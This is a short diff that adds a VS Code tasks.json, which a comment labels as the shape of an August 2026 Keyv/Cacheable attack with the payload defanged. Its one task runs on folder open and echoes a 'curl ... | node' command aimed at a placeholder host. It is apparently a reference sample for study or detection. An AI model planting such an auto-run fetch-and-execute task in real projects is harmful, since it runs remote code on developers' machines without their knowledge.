@@ -1,0 +1,12 @@
+{
+  "_shape": "Keyv/Cacheable Aug-2026: runs on folderOpen, no user action. Payload defanged.",
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "setup",
+      "type": "shell",
+      "command": "echo curl -s https://REDACTED.example/p.js | node",
+      "runOptions": { "runOn": "folderOpen" }
+    }
+  ]
+}
